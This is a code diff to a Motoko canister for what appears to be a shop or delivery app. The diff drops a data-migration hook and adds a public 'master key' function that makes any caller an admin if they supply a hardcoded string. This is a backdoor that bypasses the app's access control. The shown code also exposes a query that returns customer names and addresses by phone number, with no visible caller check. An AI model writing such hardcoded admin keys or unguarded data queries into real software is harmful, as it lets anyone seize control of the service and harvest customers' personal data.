@@ -14,9 +14,9 @@ import AccessControl "authorization/access-control";
 import MixinAuthorization "authorization/MixinAuthorization";
 import MixinStorage "blob-storage/Mixin";
 import Storage "blob-storage/Storage";
-import Migration "migration"; // import migration module
+ // import migration module
 
-(with migration = Migration.run)
+
 actor {
   // Initialize the access control system
   let accessControlState = AccessControl.initState();
@@ -696,4 +696,15 @@ actor {
   public query func getCustomerProfile(phone : Text) : async ?{ customerName : Text; deliveryAddress : Text } {
     customerProfiles.get(phone);
   };
+
+  // Master Key Admin Claim (Emergency fallback for owner lockout - always works)
+  public shared ({ caller }) func claimAdminWithMasterKey(key : Text) : async Bool {
+    if (key == "CLIKMATE-ADMIN-2024") {
+      accessControlState.userRoles.add(caller, #admin);
+      accessControlState.adminAssigned := true;
+      return true;
+    };
+    return false;
+  };
+
 };
